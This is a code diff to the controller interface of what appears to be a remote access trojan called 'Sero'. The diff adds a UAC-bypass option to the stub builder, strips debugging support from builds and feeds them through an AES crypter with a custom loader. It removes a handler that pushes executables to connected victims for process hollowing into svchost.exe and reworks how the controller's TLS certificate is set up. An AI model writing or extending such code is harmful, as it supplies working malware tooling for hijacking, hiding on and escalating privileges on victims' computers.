@@ -51,11 +51,9 @@ public partial class ServerWindow : Window
             GridAutoTasks.ItemsSource = _autoTasks;
             InitHollowTargets();
 
-            // First launch: generate cert + auth key
-            bool isFirstLaunch = !File.Exists(ConfigFilePath);
-            bool needsCert = false;
+            // First launch: cert + auth key setup
             bool needsAuthKey = string.IsNullOrEmpty(BldAuthKey.Text.Trim());
-
+            bool needsCert;
             try
             {
                 var certDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
@@ -63,28 +61,15 @@ public partial class ServerWindow : Window
             }
             catch { needsCert = true; }
 
-            if (needsCert || needsAuthKey)
+            if (needsCert)
+                ShowCertSetupDialog();
+
+            if (needsAuthKey)
             {
-                MessageBox.Show(
-                    "First launch detected.\n\nA TLS certificate and auth key will be generated and saved permanently.\nYou can export/import the certificate later if needed.",
-                    "Sero — Setup", MessageBoxButton.OK, MessageBoxImage.Information);
-
-                // Generate cert
-                try
-                {
-                    Net.CertificateHelper.GetOrCreateCertificate();
-                    Log("[+] TLS certificate generated and saved.");
-                }
-                catch (Exception ex) { Log($"[!] Cert generation failed: {ex.Message}"); }
-
-                // Generate auth key
-                if (needsAuthKey)
-                {
-                    var bytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(24);
-                    BldAuthKey.Text = Convert.ToBase64String(bytes);
-                    SaveConfig();
-                    Log("[+] Auth key generated and saved.");
-                }
+                var bytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(24);
+                BldAuthKey.Text = Convert.ToBase64String(bytes);
+                SaveConfig();
+                Log("[+] Auth key generated and saved.");
             }
 
             // Always load cert hash
@@ -319,11 +304,16 @@ public partial class ServerWindow : Window
         return GridClients.SelectedItems.Cast<ConnectedClient>().ToList();
     }
 
-    private void DisconnectClient_Click(object sender, RoutedEventArgs e)
+    private async void DisconnectClient_Click(object sender, RoutedEventArgs e)
     {
-        foreach (var client in GetSelectedClients())
+        var clients = GetSelectedClients();
+        if (_server == null) return;
+        foreach (var client in clients)
         {
-            _server?.DisconnectClient(client.Id);
+            // Send Disconnect packet so stub sets ShouldReconnect=false before stream closes
+            try { await _server.SendToClient(client.Id, new Packet { Type = PacketType.Disconnect }); } catch { }
+            await Task.Delay(150);
+            _server.DisconnectClient(client.Id);
         }
     }
 
@@ -431,57 +421,6 @@ public partial class ServerWindow : Window
         catch (Exception ex)
         {
             Log($"[!] Update client failed: {ex.Message}");
-        }
-    }
-
-    private async void HollowExec_Click(object sender, RoutedEventArgs e)
-    {
-        var clients = GetSelectedClients();
-        if (clients.Count == 0 || _server == null) return;
-
-        var dialog = new Microsoft.Win32.OpenFileDialog
-        {
-            Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
-            Title = "Select PE to inject via Process Hollowing"
-        };
-
-        if (dialog.ShowDialog() != true) return;
-
-        // Ask for target process
-        var targetDlg = new TagDialog("svchost.exe") { Owner = this };
-        targetDlg.Title = "Target Process";
-        if (targetDlg.ShowDialog() != true || string.IsNullOrWhiteSpace(targetDlg.TagValue)) return;
-
-        try
-        {
-            var fileBytes = await File.ReadAllBytesAsync(dialog.FileName);
-            var fileName = Path.GetFileName(dialog.FileName);
-            var target = targetDlg.TagValue.Trim();
-
-            var data = new HollowExecData
-            {
-                FileName = fileName,
-                FileBase64 = Convert.ToBase64String(fileBytes),
-                TargetProcess = target
-            };
-
-            var packet = new Packet
-            {
-                Type = PacketType.HollowExec,
-                Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
-            };
-
-            foreach (var client in clients)
-            {
-                await _server.SendToClient(client.Id, packet);
-            }
-
-            Log($"[+] Hollow: sent {fileName} -> {target} to {clients.Count} client(s).");
-            TxtStatusBar.Text = $"Process hollowing sent to {clients.Count} client(s).";
-        }
-        catch (Exception ex)
-        {
-            Log($"[!] Hollow exec failed: {ex.Message}");
         }
     }
 
@@ -768,6 +707,7 @@ public partial class ServerWindow : Window
             if (cfg.TryGetValue("HollowTarget", out var ht)) BldHollowTarget.Text = ht;
             if (cfg.TryGetValue("Watchdog", out v)) BldWatchdog.IsChecked = v == "1";
             if (cfg.TryGetValue("Encrypt", out v)) BldEncrypt.IsChecked = v == "1";
+            if (cfg.TryGetValue("UacBypass", out v)) BldUacBypass.IsChecked = v == "1";
 
             // Reconnect
             if (cfg.TryGetValue("ReconnectDelay", out var rd)) BldReconnectDelay.Text = rd;
@@ -807,6 +747,7 @@ public partial class ServerWindow : Window
                 ["HollowTarget"] = GetHollowTarget(),
                 ["Watchdog"] = BldWatchdog.IsChecked == true ? "1" : "0",
                 ["Encrypt"] = BldEncrypt.IsChecked == true ? "1" : "0",
+                ["UacBypass"] = BldUacBypass.IsChecked == true ? "1" : "0",
                 ["ReconnectDelay"] = BldReconnectDelay.Text.Trim(),
                 ["InstallFolder"] = BldInstallFolder.Text.Trim(),
                 ["InstallFileName"] = BldInstallFileName.Text.Trim(),
@@ -1228,7 +1169,7 @@ internal static class Config
 
             var publishArgs = useAot
                 ? $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false{iconArg} -o \"{tempOut}\""
-                : $"publish \"{csprojPath}\" -c Release -r win-x64 --self-contained -p:PublishSingleFile=true -p:PublishTrimmed=true -p:TrimMode=full -p:InvariantGlobalization=true -p:UseSystemResourceKeys=true -p:MetadataUpdaterSupport=false -p:EnableCompressionInSingleFile=true{iconArg} -o \"{tempOut}\"";
+                : $"publish \"{csprojPath}\" -c Release -r win-x64 --self-contained -p:PublishSingleFile=true -p:PublishTrimmed=true -p:TrimMode=full -p:InvariantGlobalization=true -p:UseSystemResourceKeys=true -p:MetadataUpdaterSupport=false -p:EnableCompressionInSingleFile=true -p:DebuggerSupport=false -p:StackTraceSupport=false -p:HttpActivityPropagationSupport=false -p:EnableUnsafeBinaryFormatterSerialization=false{iconArg} -o \"{tempOut}\"";
             var psi = new System.Diagnostics.ProcessStartInfo
             {
                 FileName = "dotnet",
@@ -1290,10 +1231,20 @@ internal static class Config
             {
                 TxtBuildStatus.Text = "Applying crypter...";
                 Log("[*] Builder: Applying AES crypter...");
-                await ApplyCrypter(outputExe);
-            }
 
-            // Icon is now embedded via -p:ApplicationIcon during build (no rcedit needed)
+                // Pass icon + metadata so the C++ loader is compiled with them via rc.exe
+                string? iconForLoader = (BldIconPath.Text != "No icon selected" && File.Exists(BldIconPath.Text))
+                    ? BldIconPath.Text : null;
+                var meta = (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
+                    ? new SeroServer.Builder.LoaderMetadata(product, company, fileVersion, productVersion, assemblyTitle, copyright)
+                    : null;
+
+                await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconForLoader, meta, BldUacBypass.IsChecked == true);
+            }
+            else
+            {
+                // No crypter — icon already embedded via -p:ApplicationIcon at compile time
+            }
 
             var size = new FileInfo(outputExe).Length;
             var sizeStr = size < 1024 * 1024
@@ -1336,10 +1287,6 @@ internal static class Config
         return (p.ExitCode, await outTask + await errTask);
     }
 
-    private async Task ApplyCrypter(string exePath)
-    {
-        await SeroServer.Builder.CrypterBuilder.ApplyAsync(exePath, Log);
-    }
 
 
     private void BuildConfig_Click(object sender, RoutedEventArgs e)
@@ -1414,29 +1361,31 @@ internal static class Config
             return;
         }
 
-        TxtPortResult.Text = $"Checking {ip}:{port}...";
+        TxtPortResult.Text = $"Checking {ip}:{port} from outside...";
         TxtPortResult.Foreground = (Brush)FindResource("DimBrush");
 
         try
         {
-            using var tcp = new System.Net.Sockets.TcpClient();
-            var connectTask = tcp.ConnectAsync(ip, port);
-            var completed = await Task.WhenAny(connectTask, Task.Delay(3000));
+            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(12) };
+            // hackertarget returns "open" or "closed" — external check, no hairpin NAT false positives
+            var resp = await http.GetStringAsync($"https://api.hackertarget.com/nmap/?q={ip}&port={port}");
 
-            if (completed == connectTask && tcp.Connected)
+            bool open = resp.Contains("/tcp") && resp.Contains("open");
+
+            if (open)
             {
-                TxtPortResult.Text = $"Port {port} is OPEN on {ip}";
+                TxtPortResult.Text = $"Port {port} is OPEN on {ip} (reachable from internet)";
                 TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e));
             }
             else
             {
-                TxtPortResult.Text = $"Port {port} is CLOSED on {ip} (timeout)";
+                TxtPortResult.Text = $"Port {port} is CLOSED on {ip} (not reachable from internet)";
                 TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
             }
         }
         catch (Exception ex)
         {
-            TxtPortResult.Text = $"Port {port} is CLOSED on {ip} ({ex.Message})";
+            TxtPortResult.Text = $"Check failed: {ex.Message}";
             TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
         }
     }
@@ -1726,7 +1675,108 @@ internal static class Config
         }
     }
 
-    // ── Cert Export / Import ────────────────────────
+    // ── Cert Setup / Export ─────────────────────────
+
+    /// <summary>
+    /// Shown on first launch — lets the user generate+save OR import an existing cert.
+    /// </summary>
+    private void ShowCertSetupDialog()
+    {
+        var dlg = new Window
+        {
+            Title = "Sero — TLS Certificate Setup",
+            Width = 420, Height = 200,
+            WindowStartupLocation = WindowStartupLocation.CenterScreen,
+            ResizeMode = ResizeMode.NoResize,
+            Background = new SolidColorBrush(Color.FromRgb(24, 24, 24)),
+            WindowStyle = WindowStyle.ToolWindow,
+        };
+
+        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(20) };
+
+        sp.Children.Add(new System.Windows.Controls.TextBlock
+        {
+            Text = "No TLS certificate found. Choose an option:",
+            Foreground = Brushes.White,
+            FontSize = 13,
+            Margin = new Thickness(0, 0, 0, 16),
+            TextWrapping = TextWrapping.Wrap,
+        });
+
+        var btnGen = new System.Windows.Controls.Button
+        {
+            Content = "Generate new certificate and save it…",
+            Margin = new Thickness(0, 0, 0, 8),
+            Padding = new Thickness(10, 6, 10, 6),
+            HorizontalAlignment = HorizontalAlignment.Stretch,
+        };
+        var btnImp = new System.Windows.Controls.Button
+        {
+            Content = "Import an existing certificate (.pfx)…",
+            Padding = new Thickness(10, 6, 10, 6),
+            HorizontalAlignment = HorizontalAlignment.Stretch,
+        };
+
+        btnGen.Click += (_, _) =>
+        {
+            dlg.Close();
+            var save = new Microsoft.Win32.SaveFileDialog
+            {
+                Filter = "PFX Certificate (*.pfx)|*.pfx",
+                FileName = "sero_cert.pfx",
+                Title = "Choose where to save the certificate"
+            };
+            if (save.ShowDialog() != true) return;
+            try
+            {
+                Net.CertificateHelper.GenerateAndExportTo(save.FileName);
+                Log($"[+] Certificate generated and saved to {save.FileName}");
+                try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); } catch { }
+                MessageBox.Show(
+                    $"Certificat sauvegardé :\n{save.FileName}\n\nAucun mot de passe requis pour l'importer.",
+                    "Sero — Certificat prêt", MessageBoxButton.OK, MessageBoxImage.Information);
+            }
+            catch (Exception ex) { Log($"[!] Cert generation failed: {ex.Message}"); }
+        };
+
+        btnImp.Click += (_, _) =>
+        {
+            var open = new Microsoft.Win32.OpenFileDialog
+            {
+                Filter = "PFX Certificate (*.pfx)|*.pfx",
+                Title = "Select your .pfx certificate"
+            };
+            if (open.ShowDialog() != true) return;
+
+            try
+            {
+                try { Net.CertificateHelper.ImportCertificate(open.FileName, null); }
+                catch
+                {
+                    var pwd = PromptPassword("Ce certificat est protégé par un mot de passe.\nEntrez le mot de passe PFX :");
+                    if (pwd == null) return;
+                    Net.CertificateHelper.ImportCertificate(open.FileName, pwd);
+                }
+                try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); } catch { }
+                Log("[+] Certificate imported successfully.");
+                dlg.Close();
+                MessageBox.Show("Certificat importé. Le serveur est prêt à démarrer.",
+                    "Sero — Import réussi", MessageBoxButton.OK, MessageBoxImage.Information);
+            }
+            catch (Exception ex)
+            {
+                Log($"[!] Import failed: {ex.Message}");
+                MessageBox.Show($"Import échoué : {ex.Message}\n\nVérifiez que le fichier est un .pfx valide avec clé privée exportable.",
+                    "Erreur", MessageBoxButton.OK, MessageBoxImage.Error);
+                // Don't close dialog — let user retry or choose Generate instead
+            }
+        };
+
+        sp.Children.Add(btnGen);
+        sp.Children.Add(btnImp);
+        dlg.Content = sp;
+        dlg.ShowDialog();
+    }
 
     private void ExportCert_Click(object sender, RoutedEventArgs e)
     {
@@ -1734,60 +1784,51 @@ internal static class Config
         {
             var dialog = new Microsoft.Win32.SaveFileDialog
             {
-                Filter = "PFX Certificate (*.pfx)|*.pfx|Public Key (*.cer)|*.cer",
-                FileName = "sero_server.pfx"
+                Filter = "PFX Certificate (*.pfx)|*.pfx",
+                FileName = "sero_cert.pfx",
+                Title = "Export TLS Certificate"
             };
 
-            if (dialog.ShowDialog() == true)
-            {
-                if (dialog.FileName.EndsWith(".cer", StringComparison.OrdinalIgnoreCase))
-                {
-                    var pubKey = CertificateHelper.ExportPublicKey();
-                    File.WriteAllBytes(dialog.FileName, pubKey);
-                }
-                else
-                {
-                    CertificateHelper.ExportPfx(dialog.FileName);
-                }
-                Log($"[+] Certificate exported to {dialog.FileName}");
-                TxtStatusBar.Text = "Certificate exported.";
-            }
+            if (dialog.ShowDialog() != true) return;
+
+            CertificateHelper.ExportPfx(dialog.FileName);
+            Log($"[+] Certificate exported to {dialog.FileName}");
+            TxtStatusBar.Text = "Certificate exported.";
+            MessageBox.Show(
+                $"Certificat exporté :\n{dialog.FileName}\n\nAucun mot de passe requis pour l'importer.",
+                "Sero — Export réussi", MessageBoxButton.OK, MessageBoxImage.Information);
         }
         catch (Exception ex)
         {
             Log($"[!] Export failed: {ex.Message}");
+            MessageBox.Show($"Export failed: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
         }
     }
 
-    private void ImportCert_Click(object sender, RoutedEventArgs e)
+    private static string? PromptPassword(string message)
     {
-        try
+        var dlg = new Window
         {
-            var dialog = new Microsoft.Win32.OpenFileDialog
-            {
-                Filter = "PFX Certificate (*.pfx)|*.pfx",
-                Title = "Import TLS Certificate"
-            };
-
-            if (dialog.ShowDialog() == true)
-            {
-                CertificateHelper.ImportCertificate(dialog.FileName, null);
-
-                // Refresh cert hash display
-                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); }
-                catch { }
-
-                Log("[+] Certificate imported successfully.");
-                TxtStatusBar.Text = "Certificate imported. Restart server to use it.";
-                MessageBox.Show("Certificate imported. Restart the server to use the new certificate.",
-                    "Import Success", MessageBoxButton.OK, MessageBoxImage.Information);
-            }
-        }
-        catch (Exception ex)
+            Title = "Certificate Password",
+            Width = 350, Height = 150,
+            WindowStartupLocation = WindowStartupLocation.CenterScreen,
+            ResizeMode = ResizeMode.NoResize,
+            Background = new SolidColorBrush(Color.FromRgb(30, 30, 30))
+        };
+        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(12) };
+        sp.Children.Add(new System.Windows.Controls.TextBlock
         {
-            Log($"[!] Import failed: {ex.Message}");
-            MessageBox.Show($"Import failed: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
-        }
+            Text = message, Foreground = Brushes.White, TextWrapping = TextWrapping.Wrap, Margin = new Thickness(0, 0, 0, 8)
+        });
+        var tb = new System.Windows.Controls.PasswordBox { Margin = new Thickness(0, 0, 0, 8) };
+        sp.Children.Add(tb);
+        var btn = new System.Windows.Controls.Button { Content = "OK", Width = 80, HorizontalAlignment = HorizontalAlignment.Right };
+        string? result = null;
+        btn.Click += (_, _) => { result = tb.Password; dlg.DialogResult = true; };
+        sp.Children.Add(btn);
+        dlg.Content = sp;
+        tb.Focus();
+        return dlg.ShowDialog() == true ? result : null;
     }
 
     // ── Logging ─────────────────────────────────────
